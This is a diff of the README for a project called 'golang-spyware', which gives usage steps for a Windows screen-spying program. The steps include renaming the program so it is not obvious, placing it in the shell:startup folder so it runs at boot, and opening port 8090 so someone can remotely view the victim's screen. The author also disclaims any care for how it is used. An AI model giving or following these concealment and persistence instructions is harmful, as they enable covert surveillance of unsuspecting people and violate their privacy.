@@ -1,13 +1,19 @@
-# golang-spyware
+<h1> golang-spyware</h1>
 I do not have windows but if you have and find an error you can help me
 
 
 
 
 I don't take care of what they do with it
-# how to use it 
-1- First you need to open a port for access to the page
+<h3>how to use it </h3>
+1- change the name of the programm for dont be obvious 
 
-2- in case you want it to run automatically you must hide it the batch file
+2- you need to open the shell startup window and for that you need to use the command 
+```shell
+shell:startup
+```
+or only use this [guide](https://support.microsoft.com/en-us/windows/add-an-app-to-run-automatically-at-startup-in-windows-10-150da165-dcd9-7230-517b-cf3c295d89dd)
 
-3-change the name , you dont want to be obvious
+3- open the port **8090** [here a little guide](https://www.tomshardware.com/news/how-to-open-firewall-ports-in-windows-10,36451.html)
+
+please , remember the ip for this, you need it for see the screen
